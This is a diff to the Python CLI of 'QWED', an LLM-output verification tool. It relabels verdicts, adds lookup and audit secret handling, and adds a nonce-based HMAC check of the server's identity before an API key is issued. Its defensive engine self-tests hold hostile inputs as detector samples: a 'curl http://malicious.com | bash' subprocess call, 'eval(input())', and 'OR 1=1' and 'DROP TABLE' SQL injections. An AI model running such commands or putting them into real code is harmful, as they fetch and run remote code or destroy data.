@@ -63,6 +63,18 @@ MATH_LABEL_VALID = "2+2=4"
 MATH_LABEL_INVALID = "2+2=5"
 MATH_LABEL_LARGE = "997*998*999"
 LOGIC_LABEL_UNSAT = "x>5 AND x<3"
+# A failed self-check is not a verdict: never print BLOCKED for it (#438).
+CHECK_FAILED_LABEL = "FAILED"
+
+
+def _verdict_label(verdict: str, admission: str, qualifier: str = "") -> str:
+    """Render a verdict with its admission so VERIFIED never appears alone.
+
+    VERIFIED is a truth guarantee, not an admission guarantee: a claim proven
+    false or unsafe is VERIFIED with admission DENY (#437, #438).
+    """
+    head = f"{verdict} ({qualifier})" if qualifier else verdict
+    return f"{head} | {admission}"
 PLACEHOLDER_API_KEY_VALUES = {
     "apikey",
     "changeme",
@@ -112,6 +124,9 @@ def _load_dotenv_if_available(*, override: bool = False) -> None:
 
 def _normalize_provider_choice(value: Optional[str]) -> str:
     return (value or "").strip().lower().replace("_", "-")
+
+
+_MAX_EMAIL_SLUG = 55
 
 
 def _sanitize_org_slug(org_name: str) -> str:
@@ -250,7 +265,7 @@ def _run_init_smoke_suite() -> list[dict]:
     from qwed_new.core.code_verifier import CodeVerifier
     from qwed_new.core.logic_verifier import LogicVerifier
     from qwed_new.core.sql_verifier import SQLVerifier
-    from qwed_new.core.verifier import VerificationEngine
+    from qwed_new.core.verifier import DISPROVEN_STATUS, VerificationEngine
 
     tests: list[dict] = []
 
@@ -263,8 +278,8 @@ def _run_init_smoke_suite() -> list[dict]:
     tests.append(
         {
             "label": MATH_LABEL_INVALID,
-            "passed": math_bad.get("status") == "CORRECTION_NEEDED",
-            "result": "BLOCKED",
+            "passed": math_bad.get("status") == DISPROVEN_STATUS,
+            "result": _verdict_label("VERIFIED", "DENY", "false"),
         }
     )
 
@@ -275,7 +290,7 @@ def _run_init_smoke_suite() -> list[dict]:
         {
             "label": LOGIC_LABEL_UNSAT,
             "passed": logic_bad_passed,
-            "result": "UNVERIFIABLE",
+            "result": _verdict_label("UNVERIFIABLE", "DENY"),
         }
     )
 
@@ -288,7 +303,7 @@ def _run_init_smoke_suite() -> list[dict]:
         {
             "label": "SELECT * WHERE 1=1",
             "passed": sql_bad_passed,
-            "result": "BLOCKED",
+            "result": _verdict_label("VERIFIED", "DENY", "unsafe"),
         }
     )
 
@@ -301,7 +316,7 @@ def _run_init_smoke_suite() -> list[dict]:
         {
             "label": "eval(user_input)",
             "passed": code_bad_passed,
-            "result": "VERIFIED (unsafe)",
+            "result": _verdict_label("VERIFIED", "DENY", "unsafe"),
         }
     )
     return tests
@@ -401,7 +416,11 @@ def _runtime_sqlite_database_url(runtime_dir: Path) -> str:
     return f"sqlite:///{db_path.as_posix()}"
 
 
-def _ensure_local_server_running(server_url: str, jwt_secret: str) -> tuple[bool, bool]:
+def _ensure_local_server_running(
+    server_url: str,
+    jwt_secret: str,
+    lookup_secret: Optional[str] = None,
+) -> tuple[bool, bool]:
     normalized_server_url = _normalize_local_server_url(server_url)
     if _check_server_health(normalized_server_url):
         return True, False
@@ -415,6 +434,12 @@ def _ensure_local_server_running(server_url: str, jwt_secret: str) -> tuple[bool
     if src not in current_pythonpath.split(os.pathsep):
         env["PYTHONPATH"] = f"{src}{os.pathsep}{current_pythonpath}" if current_pythonpath else src
     env["QWED_JWT_SECRET_KEY"] = jwt_secret
+    # The child boots qwed_new.auth.security, which fail-closes at import
+    # without a dedicated lookup secret (issue #372). Explicit threading —
+    # never inherit-or-crash: fall back to the parent env for legacy callers.
+    resolved_lookup = (lookup_secret or os.getenv("QWED_API_KEY_LOOKUP_SECRET", "")).strip()
+    if resolved_lookup:
+        env["QWED_API_KEY_LOOKUP_SECRET"] = resolved_lookup
     env["DATABASE_URL"] = _runtime_sqlite_database_url(runtime_dir)
 
     command = [
@@ -462,7 +487,9 @@ def _bootstrap_api_key(server_url: str, organization_name: str) -> tuple[str, st
 
     base = server_url.rstrip("/")
     org_slug = _sanitize_org_slug(organization_name)
-    email = f"{org_slug}-{secrets.token_hex(4)}@qwed-init.dev"
+    # An email local part may be at most 64 characters; "-<8 hex>" uses 9.
+    local_slug = org_slug[:_MAX_EMAIL_SLUG].rstrip("-") or "qwed-org"
+    email = f"{local_slug}-{secrets.token_hex(4)}@example.com"
     password = secrets.token_urlsafe(24)
     signup_payload = {
         "email": email,
@@ -669,7 +696,7 @@ def _ensure_gitignore_protection(verify_gitignore, add_env_to_gitignore) -> bool
 
 
 def _import_init_dependencies():
-    from qwed_new.config import ensure_jwt_secret
+    from qwed_new.config import ensure_jwt_secret, ensure_lookup_secret
     from qwed_new.providers.credential_store import (
         add_env_to_gitignore,
         verify_gitignore,
@@ -680,6 +707,7 @@ def _import_init_dependencies():
 
     return (
         ensure_jwt_secret,
+        ensure_lookup_secret,
         add_env_to_gitignore,
         verify_gitignore,
         write_env_file,
@@ -710,10 +738,11 @@ def _run_init_engine_phase(skip_tests: bool) -> None:
     failed = [case for case in suite if not case["passed"]]
     for case in suite:
         marker = "[ok]" if case["passed"] else "[x]"
-        click.echo(f"  {marker} {case['label']:<24} -> {case['result']}")
+        result = case["result"] if case["passed"] else CHECK_FAILED_LABEL
+        click.echo(f"  {marker} {case['label']:<24} -> {result}")
     if failed:
         raise RuntimeError("Built-in verification suite failed. Resolve before onboarding.")
-    click.echo("\nAll engines verified. QWED is operational.")
+    click.echo("\nAll engines ready.")
 
 
 def _resolve_onboarding_profile(
@@ -932,17 +961,89 @@ def _prompt_retry_credentials(
     return updated_key, updated_base_url, updated_model
 
 
+# Server secrets persisted by init and retained from the project-root .env.
+# QWED_AUDIT_SECRET_KEY signs the audit chain: the server refuses to boot
+# without it, and regenerating it invalidates every existing signature.
+_SERVER_SECRET_VARS = (
+    "QWED_JWT_SECRET_KEY",
+    "QWED_API_KEY_LOOKUP_SECRET",
+    "QWED_AUDIT_SECRET_KEY",
+)
+
+
+def _seed_server_secrets_from_project_root() -> set:
+    """Seed server secrets from the project-root .env without overriding env.
+
+    Issue #372 / Greptile P1 on #375: `qwed init` run from a subdirectory
+    loads only the cwd .env, so a pre-existing root secret looks missing — a
+    fresh value would then be generated and persisted OVER the root one,
+    invalidating every issued key's lookup digest. Seeding with setdefault
+    keeps explicit environment winning while letting ensure_* retain root
+    values. Scoped to the server secrets only (_SERVER_SECRET_VARS).
+
+    Returns the names actually filled, so callers can distinguish retained
+    (disk or env) from freshly generated values without re-reading files.
+    Raises RuntimeError (fail closed, QWED_RULES.md rule 2) if project-root
+    discovery fails or if the project-root .env EXISTS but cannot be read
+    or decoded: swallowing either would let a replacement overwrite secrets
+    the existing file holds (CodeRabbit on #375). A missing file is normal
+    first-run behavior and yields an empty set. Missing credential_store is
+    a genuine degrade-quietly case: the seeding feature itself is absent.
+    """
+    filled: set = set()
+    try:
+        from qwed_new.providers.credential_store import _find_project_root
+    except ImportError:
+        return filled
+    try:
+        env_path = _find_project_root() / ".env"
+    except OSError as exc:
+        # Discovery failure means we cannot know whether the canonical
+        # project-root .env exists — continuing could generate fresh
+        # secrets and persist them over the ones it holds. Fail closed
+        # (QWED_RULES.md rule 2), same as the unreadable-file case below
+        # (CodeRabbit on #375): init already exits cleanly on RuntimeError.
+        raise RuntimeError("project root could not be located") from exc
+    if not env_path.exists():
+        return filled
+    try:
+        # Decoded the way python-dotenv decodes it (quotes, escapes, inline
+        # comments), so a seeded secret is byte-for-byte what a server loading
+        # the same .env sees. A quoted signing key kept raw would differ, and
+        # every audit signature would stop verifying.
+        import io as _io
+
+        from dotenv import dotenv_values
+
+        raw = env_path.read_text(encoding="utf-8")
+        stored = {k: v for k, v in dotenv_values(stream=_io.StringIO(raw)).items() if v is not None}
+    except (OSError, UnicodeDecodeError) as exc:
+        # An EXISTING file that cannot be read or decoded must fail closed:
+        # silently proceeding could overwrite secrets it holds (CodeRabbit
+        # on #375). (UnicodeDecodeError is a ValueError, not OSError.)
+        raise RuntimeError(
+            f"project root .env exists but cannot be read: {env_path}"
+        ) from exc
+    for var in _SERVER_SECRET_VARS:
+        value = stored.get(var, "").strip()
+        if value and var not in os.environ:
+            os.environ[var] = value
+            filled.add(var)
+    return filled
+
+
 def _persist_onboarding_env(
     profile: OnboardingProvider,
     resolved_key: str,
     resolved_base_url: str,
     resolved_model: str,
     ensure_jwt_secret,
+    ensure_lookup_secret,
     verify_gitignore,
     add_env_to_gitignore,
     write_env_file,
     non_interactive: bool,
-) -> tuple[str, str]:
+) -> tuple[str, str, str]:
     env_vars = {profile.key_env: resolved_key, profile.model_env: resolved_model}
     if profile.base_url_env:
         env_vars[profile.base_url_env] = resolved_base_url
@@ -954,6 +1055,29 @@ def _persist_onboarding_env(
         raise RuntimeError(f"Failed to prepare JWT secret: {type(exc).__name__}") from exc
 
     env_vars["QWED_JWT_SECRET_KEY"] = jwt_secret
+
+    try:
+        # Stable for the lifetime of issued keys: existing values are never
+        # rotated here (issue #372). Fresh setups generate one distinct from
+        # the JWT secret, which the server refuses to boot with. The message
+        # is preserved (not just the type name) so a misconfiguration — e.g.
+        # lookup equal to JWT — tells the user exactly how to fix .env.
+        lookup_secret = ensure_lookup_secret()
+    except Exception as exc:
+        logger.exception("Lookup secret preparation failed")
+        raise RuntimeError(f"Failed to prepare lookup secret: {exc}") from exc
+
+    env_vars["QWED_API_KEY_LOOKUP_SECRET"] = lookup_secret
+
+    try:
+        # Retained when present, generated only when missing: rotating it
+        # would invalidate the signature on every audit row already written.
+        from qwed_new.config import ensure_audit_secret
+
+        env_vars["QWED_AUDIT_SECRET_KEY"] = ensure_audit_secret()
+    except Exception as exc:
+        logger.exception("Audit secret preparation failed")
+        raise RuntimeError(f"Failed to prepare audit secret: {type(exc).__name__}") from exc
 
     try:
         if non_interactive:
@@ -968,7 +1092,7 @@ def _persist_onboarding_env(
     os.environ.update(env_vars)
     os.environ["ACTIVE_PROVIDER"] = profile.active_provider
     click.echo("  [ok] Credentials stored (.env, mode 0600)")
-    return jwt_secret, env_path
+    return jwt_secret, lookup_secret, env_path
 
 
 def _resolve_organization_name(organization_name: Optional[str], non_interactive: bool) -> str:
@@ -982,6 +1106,196 @@ def _resolve_organization_name(organization_name: Optional[str], non_interactive
     if not resolved_org:
         raise RuntimeError("Organization name is required.")
     return resolved_org
+
+
+def _identity_proof(secret: str, domain: str, nonce: str) -> str:
+    """Domain-separated HMAC of the handshake nonce under one secret."""
+    import hashlib
+    import hmac
+
+    return hmac.new(
+        secret.encode(),
+        f"qwed-server-identity-v1:{domain}:{nonce}".encode(),
+        hashlib.sha256,
+    ).hexdigest()
+
+
+def _verify_server_identity(
+    server_url: str,
+    jwt_secret: str,
+    lookup_secret: str,
+    nonce: str,
+    audit_secret: str | None = None,
+) -> None:
+    """Prove the healthy server holds our secret set before bootstrap (issue #376).
+
+    A healthy `/health` only proves SOMETHING answers on the port — a foreign
+    process (or a stale server on older values, which #375's guard cannot see
+    when our secrets were retained) would otherwise receive the bootstrap and
+    issue a key the intended server cannot resolve after restart. The CLI
+    mints a fresh nonce per handshake and verifies domain-separated HMACs
+    over it: a captured response is useless for any later handshake
+    (replay-safe, unlike deterministic fingerprints). The nonce is injected
+    by the caller (fresh per init run) so this function stays deterministic
+    and testable. Empty local secrets fail closed immediately — otherwise
+    both sides would prove the empty string and match (Sentry HIGH on #388).
+    Callers fail closed (exit) — never bootstrap on unproven identity.
+
+    Residual TOCTOU (a process rebinding the port between this proof and the
+    bootstrap) is accepted: binding a released local port needs no project
+    secret, so an active local attacker could win the race without holding
+    anything. Defending against that attacker is out of scope — this
+    handshake's threat model is accidental staleness (CodeAnt race note on
+    #388; overstated "already owns secrets" wording corrected via Greptile
+    on QWED-AI/docs#291).
+    """
+    import hmac
+
+    import httpx
+
+    if not jwt_secret or not lookup_secret:
+        raise RuntimeError(
+            "server identity check failed: local secrets are missing. "
+            "Re-run init so fresh secrets are generated and persisted."
+        )
+    if not nonce:
+        raise RuntimeError(
+            "server identity check failed: no handshake nonce supplied. "
+            "Re-run init."
+        )
+    try:
+        response = httpx.get(
+            f"{server_url.rstrip('/')}/health/identity",
+            params={"nonce": nonce},
+            timeout=5.0,
+        )
+    except (httpx.HTTPError, ValueError) as exc:
+        raise RuntimeError(
+            "server identity check failed: could not reach the identity endpoint. "
+            "Restart the local server, then re-run init."
+        ) from exc
+    if response.status_code != 200:
+        raise RuntimeError(
+            "server identity check failed: the server did not prove its secrets "
+            "(older server without the handshake, foreign process, or unconfigured "
+            "server). Restart the local server, then re-run init."
+        )
+    try:
+        identity = response.json().get("identity", {})
+        remote = (
+            identity.get("jwt_hmac", ""),
+            identity.get("lookup_hmac", ""),
+            identity.get("audit_hmac", ""),
+        )
+    except (ValueError, AttributeError) as exc:
+        raise RuntimeError(
+            "server identity check failed: unreadable identity response. "
+            "Restart the local server, then re-run init."
+        ) from exc
+    names = ["jwt", "lookup"]
+    expected = [
+        _identity_proof(jwt_secret, "jwt", nonce),
+        _identity_proof(lookup_secret, "lookup", nonce),
+    ]
+    if audit_secret is not None:
+        # The audit key signs every audit row: a server on another key would
+        # write rows this project's server cannot verify after a restart.
+        if not audit_secret:
+            raise RuntimeError(
+                "server identity check failed: the local audit secret is missing. "
+                "Re-run init so it is generated and persisted."
+            )
+        names.append("audit")
+        expected.append(_identity_proof(audit_secret, "audit", nonce))
+    mismatched = [
+        name
+        for name, got, want in zip(names, remote, expected)
+        if not hmac.compare_digest(str(got), str(want))
+    ]
+    if mismatched:
+        raise RuntimeError(
+            f"server identity check failed: the running server holds a different "
+            f"{' and '.join(mismatched)} secret(s) than this project. "
+            "Restart the server so it loads this project's .env secrets, then re-run init. "
+            "Never bootstrap keys against a server you don't recognize."
+        )
+
+
+def _start_server_and_bootstrap(
+    normalized_server_url: str,
+    jwt_secret: str,
+    lookup_secret: str,
+    organization_name: str,
+    secrets_fresh: bool,
+) -> tuple[str, str]:
+    """Start (or reuse) the local server, guard stale secrets, bootstrap a key.
+
+    Extracted from init to keep it under the complexity gate (Sonar on #375).
+    Exits the process on any failure; returns (api_key, org_name) on success.
+    """
+    try:
+        server_ready, started_new = _ensure_local_server_running(
+            normalized_server_url, jwt_secret, lookup_secret
+        )
+    except ValueError as exc:
+        logger.exception("Local server target validation failed")
+        click.echo(f"  [x] Invalid server URL: {exc}", err=True)
+        sys.exit(1)
+    except Exception as exc:
+        logger.exception("Failed to start local server")
+        click.echo(f"  [x] Failed to start local server: {type(exc).__name__}", err=True)
+        click.echo("    Ensure dependencies are installed and runtime permissions allow subprocess start.", err=True)
+        sys.exit(1)
+    if not server_ready:
+        click.echo("  [x] Failed to start local server.", err=True)
+        click.echo("    Ensure dependencies are installed and `src/` is available in PYTHONPATH.", err=True)
+        click.echo(f"    Suggested fix: pip install -e \"{_project_root()}\"", err=True)
+        sys.exit(1)
+    click.echo("  [ok] Local server initialized")
+    if started_new:
+        click.echo("  [ok] Runtime path guard applied (src/ added to PYTHONPATH)")
+    elif secrets_fresh:
+        # Freshly generated secrets + pre-existing healthy server: the server
+        # cannot have them, so bootstrapping would issue a key that dies on
+        # restart (Greptile P1 on #375 — proven data loss).
+        # Never auto-restart: the process may belong to another project.
+        # Stop before bootstrapping instead of warning through.
+        click.echo("  [x] Server was already running with older secrets.", err=True)
+        click.echo("      Restart it, then re-run init so keys are issued under the persisted secrets.", err=True)
+        sys.exit(1)
+
+    # Identity proof runs on BOTH paths (issue #376): a reused server may be
+    # foreign or stale despite retained secrets (health is only a 200 check),
+    # and a fresh spawn may have lost a port race after the health poll.
+    # Either way, no bootstrap against an unproven server. The nonce is
+    # minted here (fresh per init run) and injected, keeping the verifier
+    # deterministic and testable (CodeRabbit on #388).
+    nonce = secrets.token_urlsafe(24)
+    try:
+        _verify_server_identity(
+            normalized_server_url,
+            jwt_secret,
+            lookup_secret,
+            nonce,
+            audit_secret=os.getenv("QWED_AUDIT_SECRET_KEY", "").strip(),
+        )
+    except Exception as exc:
+        logger.exception("Server identity verification failed")
+        click.echo(f"  [x] Server identity check failed: {exc}", err=True)
+        sys.exit(1)
+    click.echo("  [ok] Server identity verified")
+
+    try:
+        qwed_api_key, actual_org_name = _bootstrap_api_key(normalized_server_url, organization_name)
+    except Exception as exc:
+        logger.exception("API key bootstrap failed")
+        click.echo(f"  [x] API key bootstrap failed: {exc}", err=True)
+        sys.exit(1)
+
+    click.echo("  [ok] Organization created")
+    if actual_org_name != organization_name:
+        click.echo(f"  [ok] Organization alias used: {actual_org_name}")
+    return qwed_api_key, actual_org_name
 
 
 @cli.command()
@@ -1010,11 +1324,29 @@ def init(
     skip_tests: bool,
 ):
     """Initialize QWED onboarding: engines, provider credentials, and local API key bootstrap."""
+    # Root seeding BEFORE the cwd dotenv load (CodeRabbit on #375): a nested
+    # .env must not outrank the canonical project-root secrets. Precedence
+    # after both steps is explicit env > root .env > nested .env, because
+    # seeding uses setdefault and the dotenv load never overrides.
+    try:
+        _seed_server_secrets_from_project_root()
+    except RuntimeError as exc:
+        click.echo(f"  [x] {exc}", err=True)
+        sys.exit(1)
     _load_dotenv_if_available()
+    # Presence AFTER root seeding + dotenv load (Greptile P1 + Sentry on
+    # #375): secrets from ANY prior source — process env, root .env, or
+    # nested .env — count as retained. Only a value absent everywhere (hence
+    # generated fresh below) may stop a healthy server.
+    had_secrets_before_init = {
+        var: bool(os.getenv(var, "").strip())
+        for var in _SERVER_SECRET_VARS
+    }
 
     try:
         (
             ensure_jwt_secret,
+            ensure_lookup_secret,
             add_env_to_gitignore,
             verify_gitignore,
             write_env_file,
@@ -1024,6 +1356,11 @@ def init(
         ) = _import_init_dependencies()
     except ImportError as exc:
         click.echo(f"QWED core not found: {type(exc).__name__}", err=True)
+        sys.exit(1)
+    except RuntimeError as exc:
+        # e.g. qwed_new.config.Settings requires API_KEY_SECRET at import.
+        # Fail closed with guidance, not a traceback (Sentry on #375).
+        click.echo(f"QWED core misconfigured: {exc}", err=True)
         sys.exit(1)
 
     provider_map = _build_onboarding_provider_map(get_provider)
@@ -1038,7 +1375,7 @@ def init(
     click.echo(SEPARATOR)
     click.echo("QWED uses an LLM for natural language translation.")
     click.echo("The LLM is treated as an untrusted translator.")
-    click.echo("All outputs are verified deterministically.\n")
+    click.echo("Its outputs are checked by deterministic engines before use.\n")
     try:
         profile = _resolve_onboarding_profile(provider_choice, non_interactive, provider_map)
     except RuntimeError as exc:
@@ -1072,12 +1409,13 @@ def init(
             non_interactive=non_interactive,
             test_connection=test_connection,
         )
-        jwt_secret, env_path = _persist_onboarding_env(
+        jwt_secret, lookup_secret, env_path = _persist_onboarding_env(
             profile=profile,
             resolved_key=resolved_key,
             resolved_base_url=resolved_base_url,
             resolved_model=resolved_model,
             ensure_jwt_secret=ensure_jwt_secret,
+            ensure_lookup_secret=ensure_lookup_secret,
             verify_gitignore=verify_gitignore,
             add_env_to_gitignore=add_env_to_gitignore,
             write_env_file=write_env_file,
@@ -1102,36 +1440,13 @@ def init(
         sys.exit(1)
 
     click.echo("\n  Starting local server...")
-    try:
-        server_ready, started_new = _ensure_local_server_running(normalized_server_url, jwt_secret)
-    except ValueError as exc:
-        logger.exception("Local server target validation failed")
-        click.echo(f"  [x] Invalid server URL: {exc}", err=True)
-        sys.exit(1)
-    except Exception as exc:
-        logger.exception("Failed to start local server")
-        click.echo(f"  [x] Failed to start local server: {type(exc).__name__}", err=True)
-        click.echo("    Ensure dependencies are installed and runtime permissions allow subprocess start.", err=True)
-        sys.exit(1)
-    if not server_ready:
-        click.echo("  [x] Failed to start local server.", err=True)
-        click.echo("    Ensure dependencies are installed and `src/` is available in PYTHONPATH.", err=True)
-        click.echo(f"    Suggested fix: pip install -e \"{_project_root()}\"", err=True)
-        sys.exit(1)
-    click.echo("  [ok] Local server initialized")
-    if started_new:
-        click.echo("  [ok] Runtime path guard applied (src/ added to PYTHONPATH)")
-
-    try:
-        qwed_api_key, actual_org_name = _bootstrap_api_key(normalized_server_url, organization_name)
-    except Exception as exc:
-        logger.exception("API key bootstrap failed")
-        click.echo(f"  [x] API key bootstrap failed: {exc}", err=True)
-        sys.exit(1)
-
-    click.echo("  [ok] Organization created")
-    if actual_org_name != organization_name:
-        click.echo(f"  [ok] Organization alias used: {actual_org_name}")
+    qwed_api_key, _actual_org_name = _start_server_and_bootstrap(
+        normalized_server_url=normalized_server_url,
+        jwt_secret=jwt_secret,
+        lookup_secret=lookup_secret,
+        organization_name=organization_name,
+        secrets_fresh=not all(had_secrets_before_init.values()),
+    )
 
     click.echo(f"\n  Your API key: {qwed_api_key}")
     click.echo("  Warning: Save this key. It is shown only once.")
@@ -1144,7 +1459,7 @@ def init(
     click.echo(f"    -H \"x-api-key: {qwed_api_key}\" \\")
     click.echo("    -H \"Content-Type: application/json\" \\")
     click.echo("    -d '{\"expression\": \"2+2=4\"}'")
-    click.echo("\nDocumentation: https://docs.qwedai.com")
+    click.echo("\nDocumentation: https://docs.qwedai.tech")
     click.echo(SEPARATOR)
     click.echo(f"\nEnvironment file: {env_path}")
 
@@ -1506,7 +1821,7 @@ def _run_sql_engine_cases(sql_engine, run_case) -> None:
     run_case(
         "SQL",
         "Valid SELECT",
-        "SAFE",
+        _verdict_label("VERIFIED", "ADMIT", "safe"),
         lambda: sql_engine.verify_sql("SELECT id, name FROM users WHERE id = 123"),
         is_safe,
         lambda payload: f"status={payload.status.value}",
@@ -1514,7 +1829,7 @@ def _run_sql_engine_cases(sql_engine, run_case) -> None:
     run_case(
         "SQL",
         "OR 1=1 injection",
-        "BLOCKED",
+        _verdict_label("VERIFIED", "DENY", "unsafe"),
         lambda: sql_engine.verify_sql("SELECT * FROM users WHERE id = 1 OR 1=1"),
         is_verified_malicious,
         lambda payload: f"status={payload.status.value}, critical={payload.developer_fields.get('critical_count')}",
@@ -1522,7 +1837,7 @@ def _run_sql_engine_cases(sql_engine, run_case) -> None:
     run_case(
         "SQL",
         "DROP TABLE stacked",
-        "BLOCKED",
+        _verdict_label("VERIFIED", "DENY", "unsafe"),
         lambda: sql_engine.verify_sql("SELECT * FROM users; DROP TABLE users;"),
         is_verified_malicious,
         lambda payload: f"status={payload.status.value}, critical={payload.developer_fields.get('critical_count')}",
@@ -1583,12 +1898,12 @@ def _run_full_engine_tests() -> List[dict]:
             payload = runner()
             passed = bool(pass_check(payload))
             detail = detail_builder(payload)
-            add_result(group, label, passed, success_result if passed else "BLOCKED", detail=detail)
+            add_result(group, label, passed, success_result if passed else CHECK_FAILED_LABEL, detail=detail)
         except Exception as exc:
             add_result(group, label, False, "ERROR", detail=f"{type(exc).__name__}: {exc}")
 
     try:
-        from qwed_new.core.verifier import VerificationEngine
+        from qwed_new.core.verifier import DISPROVEN_STATUS, VerificationEngine
 
         math_engine = VerificationEngine()
     except Exception as exc:
@@ -1599,7 +1914,7 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Math",
             MATH_LABEL_VALID,
-            "VALID",
+            _verdict_label("VERIFIED", "ADMIT"),
             lambda: math_engine.verify_math("2+2", 4),
             lambda payload: payload.get("status") == "VERIFIED",
             lambda payload: f"computed={payload.get('calculated_value')}",
@@ -1607,15 +1922,15 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Math",
             MATH_LABEL_INVALID,
-            "BLOCKED",
+            _verdict_label("VERIFIED", "DENY", "false"),
             lambda: math_engine.verify_math("2+2", 5),
-            lambda payload: payload.get("status") == "CORRECTION_NEEDED",
+            lambda payload: payload.get("status") == DISPROVEN_STATUS,
             lambda payload: f"computed={payload.get('calculated_value')}",
         )
         run_case(
             "Math",
             MATH_LABEL_LARGE,
-            "994010994 (verified)",
+            _verdict_label("VERIFIED", "ADMIT", "994010994"),
             lambda: math_engine.verify_math(MATH_LABEL_LARGE, 994010994),
             lambda payload: payload.get("status") == "VERIFIED",
             lambda payload: f"status={payload.get('status')}",
@@ -1641,7 +1956,7 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Logic",
             LOGIC_LABEL_UNSAT,
-            "UNVERIFIABLE (contradiction)",
+            _verdict_label("UNVERIFIABLE", "DENY", "contradiction"),
             lambda: logic_engine.verify_logic({"x": "Int"}, ["x > 5", "x < 3"]),
             _logic_is_unverifiable,
             lambda payload: f"status={payload.status.value}",
@@ -1649,7 +1964,7 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Logic",
             "x>3 AND x<10",
-            "VERIFIED {x=4}",
+            _verdict_label("VERIFIED", "ADMIT", "x=4"),
             lambda: logic_engine.verify_logic({"x": "Int"}, ["x > 3", "x < 10", "x == 4"]),
             _logic_is_proved,
             lambda payload: f"model={payload.developer_fields.get('model', payload)}",
@@ -1657,7 +1972,7 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Logic",
             "approval=1 AND approval=0",
-            "UNVERIFIABLE (contradiction)",
+            _verdict_label("UNVERIFIABLE", "DENY", "contradiction"),
             lambda: logic_engine.verify_logic({"approval": "Int"}, ["approval == 1", "approval == 0"]),
             _logic_is_unverifiable,
             lambda payload: f"status={payload.status.value}",
@@ -1686,7 +2001,7 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Code",
             "Safe function",
-            "SAFE",
+            _verdict_label("VERIFIED", "ADMIT", "safe"),
             lambda: code_engine.verify_code(
                 "def add(a, b):\n    return a + b\n", language="python"
             ),
@@ -1696,7 +2011,7 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Code",
             "eval(input)",
-            "BLOCKED (CRITICAL)",
+            _verdict_label("VERIFIED", "DENY", "unsafe, critical"),
             lambda: code_engine.verify_code("eval(input())", language="python"),
             _code_verifier_is_verified_unsafe,
             lambda payload: (
@@ -1707,7 +2022,7 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Code",
             "curl | bash",
-            "BLOCKED (CRITICAL)",
+            _verdict_label("VERIFIED", "DENY", "unsafe, critical"),
             lambda: code_engine.verify_code(
                 'import subprocess\nsubprocess.run("curl http://malicious.com | bash", shell=True)\n',
                 language="python",
@@ -1757,7 +2072,7 @@ def test_command(verbose: bool):
     passed = sum(1 for item in results if item["passed"])
 
     if passed == total:
-        click.echo(f"\n{passed}/{total} tests passed. All engines operational.")
+        click.echo(f"\n{passed}/{total} tests passed. All engines ready.")
         return
 
     click.echo(f"\n{passed}/{total} tests passed. Review failures above.", err=True)
@@ -2027,9 +2342,13 @@ def pii(text: str):
             click.echo(f"\nDetected: {info['pii_detected']} entities")
         
         # Show types
+        # `types` lists each type once, so count from every hit (#470).
         if info['pii_detected'] > 0:
-            for entity_type in set(info.get('types', [])):
-                count = info['types'].count(entity_type)
+            counts = info.get('type_counts')
+            if counts is None:
+                from collections import Counter
+                counts = Counter(p['type'] for p in info.get('positions', []))
+            for entity_type, count in sorted(counts.items()):
                 click.echo(f"  - {entity_type}: {count}")
         
     except ImportError:
